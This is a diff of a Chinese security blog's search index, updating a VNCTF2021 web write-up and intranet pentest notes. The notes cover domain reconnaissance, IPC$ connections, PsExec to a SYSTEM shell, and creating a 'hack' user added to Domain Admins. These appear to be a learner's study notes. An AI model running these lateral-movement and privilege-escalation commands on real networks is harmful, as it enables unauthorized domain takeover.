@@ -334,6 +334,11 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE复现</title>
+    <url>/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>MARDASCTF2021</title>
     <url>/2021/05/02/MARDASCTF2021/</url>
     <content><![CDATA[<h2 id="BestDB-sql注入类型"><a href="#BestDB-sql注入类型" class="headerlink" title="BestDB -sql注入类型"></a>BestDB -sql注入类型</h2><p><img src="/2021/05/02/MARDASCTF2021/1.png" alt="1"></p>
@@ -403,43 +408,6 @@
       </categories>
       <tags>
         <tag>Oracel注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VNCTF2021-web</title>
-    <url>/2021/03/29/VNCTF2021-web/</url>
-    <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
-<p>玩游戏，太菜了，通不了关。自己复现总结下网上的wp。</p>
-<p>F12看源码，重点看game.js</p>
-<span id="more"></span>
-
-<p><img src="/2021/03/29/VNCTF2021-web/2.png" alt="2"></p>
-<p>####思路1</p>
-<p>在game.js里面我们发现类似加密的东西。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;\x66\x69\x6c\x74\x65\x72&quot;][&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;][&#39;\x61\x70\x70\x6c\x79&#39;](null,&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;[&#39;\x73\x70\x6c\x69\x74&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure>
-
-<p>sojson.v4加密 在 <a href="http://oa.xiximiao.com/tools/_jsDec/index.html%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://oa.xiximiao.com/tools/_jsDec/index.html进行解密</a></p>
-<p><img src="/2021/03/29/VNCTF2021-web/3.png" alt="3"></p>
-<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>直接把加密内容丢控制台</p>
-<p><img src="/2021/03/29/VNCTF2021-web/4.png" alt="4"></p>
-<h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>在geme.js我们会发现一些代码，对应血量、血量上限、小回旋镖数量、大回旋镖数量、金币数量。</p>
-<p><img src="/2021/03/29/VNCTF2021-web/5.png" alt="5"></p>
-<p>我们可以在控制台修改响应值，玩游戏通过就行了</p>
-<p><img src="/2021/03/29/VNCTF2021-web/6.png" alt="6"></p>
-<h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p><img src="/2021/03/29/VNCTF2021-web/7.png" alt="7"></p>
-<p>网上人家说的这个地方在控制台输入winTimer.Set();即可拿到flag</p>
-<p><img src="/2021/03/29/VNCTF2021-web/8.png" alt="8"></p>
-<p>或者winTimer[“endTime”] =99也可以</p>
-<h4 id="思路5"><a href="#思路5" class="headerlink" title="思路5"></a>思路5</h4><p>关键函数NextLevel()，一直跳下一关。。。</p>
-<h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><p>这个真真不会，没有学过。</p>
-<p><a href="https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%EF%BC%8C%E7%AD%89%E5%AD%A6%E4%B9%A0nodejs%E5%86%8D%E7%9C%8B%E7%9C%8B%E3%80%82">https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501暂时不会，等学习nodejs再看看。</a></p>
-<p><a href="https://www.icode9.com/content-4-891931.html">https://www.icode9.com/content-4-891931.html</a></p>
-<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>VNCTF2021-web</tag>
       </tags>
   </entry>
   <entry>
@@ -547,6 +515,43 @@
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VNCTF2021-web</title>
+    <url>/2021/03/29/VNCTF2021-web/</url>
+    <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
+<p>玩游戏，太菜了，通不了关。自己复现总结下网上的wp。</p>
+<p>F12看源码，重点看game.js</p>
+<span id="more"></span>
+
+<p><img src="/2021/03/29/VNCTF2021-web/2.png" alt="2"></p>
+<p>####思路1</p>
+<p>在game.js里面我们发现类似加密的东西。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;\x66\x69\x6c\x74\x65\x72&quot;][&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;][&#39;\x61\x70\x70\x6c\x79&#39;](null,&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;[&#39;\x73\x70\x6c\x69\x74&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>sojson.v4加密 在 <a href="http://oa.xiximiao.com/tools/_jsDec/index.html%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://oa.xiximiao.com/tools/_jsDec/index.html进行解密</a></p>
+<p><img src="/2021/03/29/VNCTF2021-web/3.png" alt="3"></p>
+<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>直接把加密内容丢控制台</p>
+<p><img src="/2021/03/29/VNCTF2021-web/4.png" alt="4"></p>
+<h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>在geme.js我们会发现一些代码，对应血量、血量上限、小回旋镖数量、大回旋镖数量、金币数量。</p>
+<p><img src="/2021/03/29/VNCTF2021-web/5.png" alt="5"></p>
+<p>我们可以在控制台修改响应值，玩游戏通过就行了</p>
+<p><img src="/2021/03/29/VNCTF2021-web/6.png" alt="6"></p>
+<h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p><img src="/2021/03/29/VNCTF2021-web/7.png" alt="7"></p>
+<p>网上人家说的这个地方在控制台输入winTimer.Set();即可拿到flag</p>
+<p><img src="/2021/03/29/VNCTF2021-web/8.png" alt="8"></p>
+<p>或者winTimer[“endTime”] =99也可以</p>
+<h4 id="思路5"><a href="#思路5" class="headerlink" title="思路5"></a>思路5</h4><p>关键函数NextLevel()，一直跳下一关。。。</p>
+<h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><p>这个真真不会，没有学过。</p>
+<p><a href="https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%EF%BC%8C%E7%AD%89%E5%AD%A6%E4%B9%A0nodejs%E5%86%8D%E7%9C%8B%E7%9C%8B%E3%80%82">https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501暂时不会，等学习nodejs再看看。</a></p>
+<p><a href="https://www.icode9.com/content-4-891931.html">https://www.icode9.com/content-4-891931.html</a></p>
+<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>VNCTF2021-web</tag>
       </tags>
   </entry>
   <entry>
@@ -788,7 +793,7 @@
 <ol>
 <li><code>md5([1])===md5([2])==NULL</code></li>
 </ol>
-<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
+<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
 ]]></content>
       <categories>
         <category>php</category>
@@ -1061,7 +1066,7 @@
 
 
 
-<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br></pre></td></tr></table></figure>
+<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1077,6 +1082,9 @@
 <p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
 <p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
 <p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
+<p>命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>内网</category>
@@ -1088,20 +1096,57 @@
   <entry>
     <title>内网横向渗透</title>
     <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<p>不断更新</p>
+<p>配合impacket工具使用</p>
+<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
+<p>利用条件：</p>
+<ol>
+<li>开放139,445端口</li>
+<li></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>
 
 
 
-<p>待更新</p>
-<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #提权，记得将PsExec64.exe上传到远程桌面上</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
 
-]]></content>
+
+
+
+<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="PTH哈希传递（mimikatz-ntml-hash）"><a href="#PTH哈希传递（mimikatz-ntml-hash）" class="headerlink" title="PTH哈希传递（mimikatz+ntml hash）"></a>PTH哈希传递（mimikatz+ntml hash）</h1><h1 id="PTT票据传递"><a href="#PTT票据传递" class="headerlink" title="PTT票据传递"></a>PTT票据传递</h1><h1 id><a href="#" class="headerlink" title></a></h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><ul>
+<li>ZeroLogon(CVE-2020-1472)</li>
+<li></li>
+</ul>
+<h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1>]]></content>
       <categories>
         <category>内网</category>
       </categories>
       <tags>
         <tag>内网横向渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网知识学习</title>
+    <url>/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>[toc]</p>
